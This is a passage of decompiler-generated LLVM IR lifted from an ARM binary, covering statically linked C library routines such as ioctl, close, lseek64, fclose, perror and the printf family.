  %v2_234c4 = phi i32 [ %v3_23498, %entry ], [ %v2_234c4.pre, %dec_label_pc_234b0 ]
  %v0_234c0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_234b0 ]
  store i32 %v2_234c4, i32* %r7.global-to-local, align 4
  ret i32 %v0_234c0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_234c0, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_234cc = load i32, i32* @r3, align 4
  store i32 %v9_234cc, i32* %stack_var_-4, align 4
  %v2_234d8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_234d8, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_2350c, label %dec_label_pc_234fc

dec_label_pc_234fc:                               ; preds = %entry
  %v0_234fc = call i32 @__GI___errno_location()
  %v0_23500 = load i32, i32* %r7.global-to-local, align 4
  %v1_23500 = sub i32 0, %v0_23500
  store i32 %v1_23500, i32* @r3, align 4
  %v2_23504 = inttoptr i32 %v0_234fc to i32*
  store i32 %v1_23500, i32* %v2_23504, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2350c

dec_label_pc_2350c:                               ; preds = %entry, %dec_label_pc_234fc
  %v0_2350c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_234fc ]
  ret i32 %v0_2350c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2350c, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_23520 = load i32, i32* @r7, align 4
  store i32 %v3_23520, i32* %stack_var_-8, align 4
  %v0_2352c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2352c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_2352c, -4095
  br i1 %tmp, label %dec_label_pc_2354c, label %dec_label_pc_2353c

dec_label_pc_2353c:                               ; preds = %entry
  %v0_2353c = call i32 @__GI___errno_location()
  %v0_23540 = load i32, i32* %r7.global-to-local, align 4
  %v1_23540 = sub i32 0, %v0_23540
  %v2_23544 = inttoptr i32 %v0_2353c to i32*
  store i32 %v1_23540, i32* %v2_23544, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_2354c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_2354c

dec_label_pc_2354c:                               ; preds = %entry, %dec_label_pc_2353c
  %v1_23550 = phi i32 [ %v0_2352c, %entry ], [ -1, %dec_label_pc_2353c ]
  %v2_2354c = phi i32 [ %v3_23520, %entry ], [ %v2_2354c.pre, %dec_label_pc_2353c ]
  store i32 %v2_2354c, i32* @r7, align 4
  ret i32 %v1_23550

; uselistorder directives
  uselistorder i32 %v0_2352c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2354c, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_23558.outer

dec_label_pc_23558.outer:                         ; preds = %dec_label_pc_23570, %entry
  %v0_23558.ph = phi i32 [ %v0_23558.pre.pre, %dec_label_pc_23570 ], [ %arg1, %entry ]
  %tmp = icmp ult i32 %v0_23558.ph, -4095
  br label %dec_label_pc_23558

dec_label_pc_23558:                               ; preds = %dec_label_pc_23558.outer, %dec_label_pc_23558
  br i1 %tmp, label %dec_label_pc_23558, label %dec_label_pc_23570

dec_label_pc_23570:                               ; preds = %dec_label_pc_23558
  %v0_23570 = call i32 @__GI___errno_location()
  %v1_23574 = sub i32 0, %v0_23558.ph
  %v2_23578 = inttoptr i32 %v0_23570 to i32*
  store i32 %v1_23574, i32* %v2_23578, align 4
  %v0_23558.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_23558.outer

; uselistorder directives
  uselistorder i32 %v0_23558.ph, { 1, 0 }
  uselistorder label %dec_label_pc_23558, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_23580 = load i32, i32* @r7, align 4
  store i32 %v3_23580, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_235ac, label %dec_label_pc_2359c

dec_label_pc_2359c:                               ; preds = %entry
  %v0_2359c = call i32 @__GI___errno_location()
  %v0_235a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_235a0 = sub i32 0, %v0_235a0
  %v2_235a4 = inttoptr i32 %v0_2359c to i32*
  store i32 %v1_235a0, i32* %v2_235a4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_235b0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_235ac

dec_label_pc_235ac:                               ; preds = %entry, %dec_label_pc_2359c
  %v2_235b0 = phi i32 [ %v3_23580, %entry ], [ %v2_235b0.pre, %dec_label_pc_2359c ]
  %v0_235ac = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_2359c ]
  store i32 %v2_235b0, i32* @r7, align 4
  ret i32 %v0_235ac

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_235ac, { 1, 0 }
}

define i32 @__GI_close(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_235b8 = load i32, i32* @r7, align 4
  store i32 %v3_235b8, i32* %stack_var_-8, align 4
  %v0_235c4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_235c4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_235c4, -4095
  br i1 %tmp, label %dec_label_pc_235e4, label %dec_label_pc_235d4

dec_label_pc_235d4:                               ; preds = %entry
  %v0_235d4 = call i32 @__GI___errno_location()
  %v0_235d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_235d8 = sub i32 0, %v0_235d8
  %v2_235dc = inttoptr i32 %v0_235d4 to i32*
  store i32 %v1_235d8, i32* %v2_235dc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_235e4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_235e4

dec_label_pc_235e4:                               ; preds = %entry, %dec_label_pc_235d4
  %v1_235e8 = phi i32 [ %v0_235c4, %entry ], [ -1, %dec_label_pc_235d4 ]
  %v2_235e4 = phi i32 [ %v3_235b8, %entry ], [ %v2_235e4.pre, %dec_label_pc_235d4 ]
  store i32 %v2_235e4, i32* @r7, align 4
  ret i32 %v1_235e8

; uselistorder directives
  uselistorder i32 %v0_235c4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_235e4, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_2362c, label %dec_label_pc_23618

dec_label_pc_23618:                               ; preds = %entry
  %v0_23618 = call i32 @__GI___errno_location()
  %v0_2361c = load i32, i32* %r4.global-to-local, align 4
  %v1_2361c = sub i32 0, %v0_2361c
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_23624 = inttoptr i32 %v0_23618 to i32*
  store i32 %v1_2361c, i32* %v2_23624, align 4
  %v0_23634.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_23634

dec_label_pc_2362c:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_2362c = icmp eq i32 %arg1, 0
  br i1 %v2_2362c, label %dec_label_pc_23640, label %dec_label_pc_23634

dec_label_pc_23634:                               ; preds = %dec_label_pc_2362c, %dec_label_pc_23618
  %v0_23634 = phi i32 [ %arg1, %dec_label_pc_2362c ], [ %v0_23634.pre, %dec_label_pc_23618 ]
  %v3_23638 = ashr i32 %v0_23634, 31
  br label %dec_label_pc_23644

dec_label_pc_23640:                               ; preds = %dec_label_pc_2362c
  br label %dec_label_pc_23644

dec_label_pc_23644:                               ; preds = %dec_label_pc_23634, %dec_label_pc_23640
  %v1_2364c = phi i32 [ %v0_23634, %dec_label_pc_23634 ], [ %tmp8, %dec_label_pc_23640 ]
  %storemerge = phi i32 [ %v3_23638, %dec_label_pc_23634 ], [ %tmp, %dec_label_pc_23640 ]
  store i32 %storemerge, i32* @r1, align 4
  ret i32 %v1_2364c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_23644, { 1, 0 }
}

define i32 @__libc_open64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r3, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_23650 = load i32, i32* @r3, align 4
  store i32 %v9_23650, i32* %stack_var_-4, align 4
  %v1_23660 = and i32 %arg1, 64
  store i32 %v1_23660, i32* @r2, align 4
  %v2_23660 = icmp eq i32 %v1_23660, 0
  br i1 %v2_23660, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v3_23664 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_23664, i32* @r3, align 4
  store i32 %arg2, i32* @r2, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_2366c = or i32 %arg1, 131072
  %v0_23674 = load i32, i32* @r0, align 4
  %v2_23674 = call i32 @__GI_open(i32 %v0_23674, i32 %v1_2366c)
  ret i32 %v2_23674

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_2368c = add i32 %arg1, 128
  %v2_23690 = icmp ugt i32 %v1_2368c, 383
  %v0_23698 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_23690, i32 %v0_23698)
  %v4_236a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 20244) to i32*), align 4
  %v2_236a4 = mul i32 %arg1, 2
  %v2_236a8 = add i32 %v4_236a0, %v2_236a4
  %v3_236a8 = inttoptr i32 %v2_236a8 to i16*
  %v4_236a8 = load i16, i16* %v3_236a8, align 2
  %v6_236a8 = sext i16 %v4_236a8 to i32
  ret i32 %v6_236a8
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r3, align 4
  ret i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 46948)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_236d4 = load i32, i32* @r4, align 4
  store i32 %v3_236d4, i32* %stack_var_-36, align 4
  %v6_236d4 = load i32, i32* @r5, align 4
  %v9_236d4 = load i32, i32* @r6, align 4
  %v12_236d4 = load i32, i32* @r7, align 4
  %v15_236d4 = load i32, i32* @r8, align 4
  %v27_236d4 = load i32, i32* @lr, align 4
  %v2_236d8 = add i32 %tmp, 52
  %v3_236d8 = inttoptr i32 %v2_236d8 to i32*
  %v4_236d8 = load i32, i32* %v3_236d8, align 4
  %v1_236e0 = sub i32 1, %v4_236d8
  %v2_236e0 = icmp ult i32 %v4_236d8, 2
  br i1 %v2_236e0, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_236e0, %entry ]
  %v0_236e8 = phi i32 [ 0, %bb ], [ %v1_236e0, %entry ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_236e8 = icmp eq i32 %v0_236e8, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  br i1 %v2_236e8, label %dec_label_pc_23734, label %dec_label_pc_236fc

dec_label_pc_236fc:                               ; preds = %thread-pre-split
  %v4_23714 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_23714)
  %v0_23728 = load i32, i32* @r6, align 4
  %v2_23728 = add i32 %v0_23728, 36
  %v3_23728 = inttoptr i32 %v2_23728 to i32*
  %v4_23728 = load i32, i32* %v3_23728, align 4
  call void @__pseudo_branch(i32 %v4_23728)
  %v0_23734.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_23734

dec_label_pc_23734:                               ; preds = %thread-pre-split, %dec_label_pc_236fc
  %v1_2373c = phi i32 [ %tmp, %thread-pre-split ], [ %v0_23734.pre, %dec_label_pc_236fc ]
  %v1_23734 = inttoptr i32 %v1_2373c to i16*
  %v2_23734 = load i16, i16* %v1_23734, align 2
  %v3_23734 = zext i16 %v2_23734 to i32
  %v1_23738 = and i32 %v3_23734, 64
  %v2_23738 = icmp eq i32 %v1_23738, 0
  br i1 %v2_23738, label %bb18, label %bb17

bb17:                                             ; preds = %dec_label_pc_23734
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_23734, %bb17
  %storemerge24 = phi i32 [ %v1_2373c, %bb17 ], [ %v1_23738, %dec_label_pc_23734 ]
  %v1_23740 = xor i1 %v2_23738, true
  call void @__pseudo_cond_branch(i1 %v1_23740, i32 ptrtoint (i32* @global_var_25970.1568 to i32))
  store i32 %storemerge24, i32* %sl.global-to-local, align 4
  %v0_23748 = load i32, i32* @r5, align 4
  %v1_23748 = add i32 %v0_23748, 4
  %v2_23748 = inttoptr i32 %v1_23748 to i32*
  %v3_23748 = load i32, i32* %v2_23748, align 4
  %v1_2374c = call i32 @__GI_close(i32 %v3_23748)
  %v0_23754 = load i32, i32* @r6, align 4
  %v2_23760 = add i32 %v0_23754, 248
  %v3_23760 = inttoptr i32 %v2_23760 to i32*
  %v4_23760 = load i32, i32* %v3_23760, align 4
  store i32 %v4_23760, i32* @r7, align 4
  %v1_23768 = load i32, i32* @r5, align 4
  %v2_23768 = add i32 %v1_23768, 4
  %v3_23768 = inttoptr i32 %v2_23768 to i32*
  store i32 -1, i32* %v3_23768, align 4
  %v0_23770 = load i32, i32* @r6, align 4
  %v2_23770 = add i32 %v0_23770, 164
  %v3_23770 = inttoptr i32 %v2_23770 to i32*
  %v4_23770 = load i32, i32* %v3_23770, align 4
  %v1_23778 = icmp slt i32 %v1_2374c, 0
  store i32 %v4_23770, i32* %stack_var_-80, align 4
  br i1 %v1_23778, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  call void @__pseudo_branch(i32 %v4_23770)
  %v0_237a0 = load i32, i32* @r6, align 4
  %v2_237a0 = add i32 %v0_237a0, 36
  %v3_237a0 = inttoptr i32 %v2_237a0 to i32*
  %v4_237a0 = load i32, i32* %v3_237a0, align 4
  call void @__pseudo_branch(i32 %v4_237a0)
  %v0_237b0 = load i32, i32* @r6, align 4
  %v2_237b0 = add i32 %v0_237b0, 12
  %v3_237b0 = inttoptr i32 %v2_237b0 to i32*
  %v4_237b0 = load i32, i32* %v3_237b0, align 4
  %v1_237b4 = inttoptr i32 %v4_237b0 to i32*
  %v2_237b4 = load i32, i32* %v1_237b4, align 4
  %v1_237bc = add i32 %v2_237b4, 1
  %v2_237c0 = add i32 %v0_237b0, 76
  %v3_237c0 = inttoptr i32 %v2_237c0 to i32*
  %v4_237c0 = load i32, i32* %v3_237c0, align 4
  store i32 %v4_237c0, i32* @r4, align 4
  store i32 %v1_237bc, i32* %v1_237b4, align 4
  call void @__pseudo_branch(i32 %v4_237c0)
  %v0_237d8 = load i32, i32* @r5, align 4
  %v1_237d8 = inttoptr i32 %v0_237d8 to i16*
  %v2_237d8 = load i16, i16* %v1_237d8, align 2
  %v1_237dc = and i16 %v2_237d8, 24576
  %v1_237e0 = or i16 %v1_237dc, 48
  %v0_237e4 = load i32, i32* %sb.global-to-local, align 4
  %v2_237e4 = icmp eq i32 %v0_237e4, 0
  store i16 %v1_237e0, i16* %v1_237d8, align 2
  br i1 %v2_237e4, label %.thread, label %bb21

bb21:                                             ; preds = %bb20
  br label %.thread

.thread:                                          ; preds = %bb20, %bb21
  %v2_237f8 = xor i1 %v2_237e4, true
  call void @__pseudo_cond_branch(i1 %v2_237f8, i32 %v4_237c0)
  %v0_237fc = load i32, i32* @r5, align 4
  %v1_237fc = inttoptr i32 %v0_237fc to i16*
  %v2_237fc = load i16, i16* %v1_237fc, align 2
  %v1_23800 = and i16 %v2_237fc, 16384
  %v2_23800 = icmp eq i16 %v1_23800, 0
  br i1 %v2_23800, label %bb23, label %bb22

bb22:                                             ; preds = %.thread
  br label %bb23

bb23:                                             ; preds = %.thread, %bb22
  %v1_23808 = xor i1 %v2_23800, true
  call void @__pseudo_cond_branch(i1 %v1_23808, i32 ptrtoint (i32* @global_var_29ae4.1572 to i32))
  %v2_23814 = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_23814)
  call void @__pseudo_branch(i32 %v4_237a0)
  %v0_23834 = load i32, i32* @r6, align 4
  %v2_23834 = add i32 %v0_23834, 116
  %v3_23834 = inttoptr i32 %v2_23834 to i32*
  %v4_23834 = load i32, i32* %v3_23834, align 4
  %v1_23838 = inttoptr i32 %v4_23834 to i32*
  %v2_23838 = load i32, i32* %v1_23838, align 4
  %v1_2383c = add i32 %v2_23838, 1
  store i32 %v1_2383c, i32* %v1_23838, align 4
  call void @__pseudo_branch(i32 %v4_237c0)
  %v0_23854 = call i32 @_stdio_openlist_dec_use()
  %v0_23858 = load i32, i32* %sl.global-to-local, align 4
  %v2_23860 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_23860, i32* @r4, align 4
  store i32 %v6_236d4, i32* @r5, align 4
  store i32 %v9_236d4, i32* @r6, align 4
  store i32 %v12_236d4, i32* @r7, align 4
  store i32 %v15_236d4, i32* @r8, align 4
  store i32 %v27_236d4, i32* @lr, align 4
  ret i32 %v0_23858

; uselistorder directives
  uselistorder i1 %v2_23800, { 1, 0 }
  uselistorder i32 %v4_237c0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_236e0, { 1, 0 }
  uselistorder i32 %v4_236d8, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_23734, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_2386c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_2386c:
  %v0_2386c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2386c, label %.thread2, label %.thread5

.thread2:                                         ; preds = %dec_label_pc_2386c
  call void @llvm.trap()
  unreachable

.thread5:                                         ; preds = %dec_label_pc_2386c
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_23898 = call i32 @_stdio_fopen()
  ret i32 %v0_23898
}

define i32 @perror(i8* %arg1) local_unnamed_addr {
entry:
  %v0_238a8 = load i32, i32* @lr, align 4
  %v3_238b0 = icmp eq i8* %arg1, null
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @ip, align 4
  br i1 %v3_238b0, label %dec_label_pc_238d4, label %dec_label_pc_238c0

dec_label_pc_238c0:                               ; preds = %entry
  %v2_238c0 = load i8, i8* %arg1, align 1
  %v2_238c4 = icmp eq i8 %v2_238c0, 0
  br i1 %v2_238c4, label %dec_label_pc_238d4, label %.thread

.thread:                                          ; preds = %dec_label_pc_238c0
  br label %dec_label_pc_238e4

dec_label_pc_238d4:                               ; preds = %dec_label_pc_238c0, %entry
  br label %dec_label_pc_238e4

dec_label_pc_238e4:                               ; preds = %.thread, %dec_label_pc_238d4
  %storemerge = phi i32 [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39512), %.thread ], [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39510), %dec_label_pc_238d4 ]
  store i32 %storemerge, i32* @lr, align 4
  %v4_238ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 196) to i32*), align 4
  %v1_238f4 = inttoptr i32 %v4_238ec to i32*
  %v2_238f4 = load i32, i32* %v1_238f4, align 4
  store i32 %v2_238f4, i32* @r0, align 4
  %v2_238fc = call i32 @fprintf(i32 %v2_238f4, i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39508))
  store i32 %v0_238a8, i32* @lr, align 4
  ret i32 %v2_238fc

; uselistorder directives
  uselistorder label %dec_label_pc_238e4, { 1, 0 }
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_23930 = load i32, i32* @r0, align 4
  %v4_23930 = inttoptr i32 %v0_23930 to i8*
  %v5_23930 = call i32 @__GI_vsnprintf(i8* %v4_23930, i32 -1, i32 %arg1, i32 %arg2)
  ret i32 %v5_23930
}

define i32 @fprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_2394c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_2394c, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_2395c = call i32 @__GI_vfprintf()
  ret i32 %v0_2395c

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-4, align 4
  %v2_2397c = ptrtoint i32* %stack_var_-4 to i32
  %v0_2398c = load i32, i32* @r0, align 4
  %v1_2398c = load i32, i32* @r1, align 4
  %v4_2398c = inttoptr i32 %v0_2398c to i8*
  %v5_2398c = call i32 @__GI_vsnprintf(i8* %v4_2398c, i32 %v1_2398c, i32 %arg1, i32 %v2_2397c)
  ret i32 %v5_2398c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @__GI_asprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_239ac = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_239ac, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_239bc = call i32 @__GI_vasprintf()
  ret i32 %v0_239bc

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_239dc = ptrtoint i32* %stack_var_-8 to i32
  %v0_239f0 = load i32, i32* @r0, align 4
  %v4_239f0 = inttoptr i32 %v0_239f0 to i8*
  %v5_239f0 = call i32 @__GI_vsnprintf(i8* %v4_239f0, i32 -1, i32 %arg1, i32 %v2_239dc)
  ret i32 %v5_239f0

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vasprintf() local_unnamed_addr {
entry:
  %v3_23a04 = load i32, i32* @r4, align 4
  %v6_23a04 = load i32, i32* @r5, align 4
  %v9_23a04 = load i32, i32* @r6, align 4
  %v12_23a04 = load i32, i32* @r7, align 4
  %v15_23a04 = load i32, i32* @r8, align 4
  %v0_23a08 = load i32, i32* @r2, align 4
  store i32 %v0_23a08, i32* @r6, align 4
  %v0_23a0c = load i32, i32* @r0, align 4
  store i32 %v0_23a0c, i32* @r5, align 4
  %v0_23a10 = load i32, i32* @r1, align 4
  store i32 %v0_23a10, i32* @r7, align 4
  %v5_23a2c = call i32 @__GI_vsnprintf(i8* null, i32 0, i32 %v0_23a10, i32 %v0_23a08)
  store i32 0, i32* @r8, align 4
  store i32 %v5_23a2c, i32* @r4, align 4
  %v1_23a34 = icmp slt i32 %v5_23a2c, 0
  %v1_23a38 = load i32, i32* @r5, align 4
  %v2_23a38 = inttoptr i32 %v1_23a38 to i32*
  store i32 0, i32* %v2_23a38, align 4
  br i1 %v1_23a34, label %dec_label_pc_23a7c, label %dec_label_pc_23a40

dec_label_pc_23a40:                               ; preds = %entry
  %v0_23a40 = load i32, i32* @r4, align 4
  %v1_23a40 = add i32 %v0_23a40, 1
  store i32 %v1_23a40, i32* @r4, align 4
  %v1_23a48 = call i32 @malloc(i32 %v1_23a40)
  %v1_23a4c = load i32, i32* @r8, align 4
  %v9_23a4c = icmp eq i32 %v1_23a48, %v1_23a4c
  %v1_23a50 = load i32, i32* @r5, align 4
  %v2_23a50 = inttoptr i32 %v1_23a50 to i32*
  store i32 %v1_23a48, i32* %v2_23a50, align 4
  br i1 %v9_23a4c, label %dec_label_pc_23a7c, label %dec_label_pc_23a58

dec_label_pc_23a58:                               ; preds = %dec_label_pc_23a40
  %v0_23a58 = load i32, i32* @r4, align 4
  %v0_23a5c = load i32, i32* @r7, align 4
  %v0_23a60 = load i32, i32* @r6, align 4
  %v4_23a64 = inttoptr i32 %v1_23a48 to i8*
  %v5_23a64 = call i32 @__GI_vsnprintf(i8* %v4_23a64, i32 %v0_23a58, i32 %v0_23a5c, i32 %v0_23a60)
  store i32 %v5_23a64, i32* @r4, align 4
  %v1_23a68 = icmp slt i32 %v5_23a64, 0
  br i1 %v1_23a68, label %dec_label_pc_23a70, label %dec_label_pc_23a7c

dec_label_pc_23a70:                               ; preds = %dec_label_pc_23a58
  %v0_23a70 = load i32, i32* @r5, align 4
  %v1_23a70 = inttoptr i32 %v0_23a70 to i32*
  %v2_23a70 = load i32, i32* %v1_23a70, align 4
  store i32 %v2_23a70, i32* @r0, align 4
  %v0_23a74 = call i32 @free()
  %v0_23a78 = load i32, i32* @r8, align 4
  %v1_23a78 = load i32, i32* @r5, align 4
  %v2_23a78 = inttoptr i32 %v1_23a78 to i32*
  store i32 %v0_23a78, i32* %v2_23a78, align 4
  br label %dec_label_pc_23a7c

dec_label_pc_23a7c:                               ; preds = %dec_label_pc_23a58, %dec_label_pc_23a40, %entry, %dec_label_pc_23a70
  %v0_23a7c = load i32, i32* @r4, align 4
  store i32 %v3_23a04, i32* @r4, align 4
  store i32 %v6_23a04, i32* @r5, align 4
  store i32 %v9_23a04, i32* @r6, align 4
  store i32 %v12_23a04, i32* @r7, align 4
  store i32 %v15_23a04, i32* @r8, align 4
  ret i32 %v0_23a7c

; uselistorder directives
  uselistorder label %dec_label_pc_23a7c, { 3, 0, 1, 2 }
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v3_23a8c = load i32, i32* @r4, align 4
  %v6_23a8c = load i32, i32* @r5, align 4
  %v9_23a8c = load i32, i32* @r6, align 4
  %v12_23a8c = load i32, i32* @r7, align 4
  %v18_23a8c = load i32, i32* @sl, align 4
  %v2_23a94 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v2_23aa0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_23aa0, i32* @r0, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 1, i32* @ip, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 208, i32* %stack_var_-112, align 4
  %v1_23acc = call i32 @__stdio_init_mutex(i32 %v2_23aa0)
  %v0_23ad0 = load i32, i32* @r4, align 4
  %v1_23ad0 = sub i32 -1, %v0_23ad0
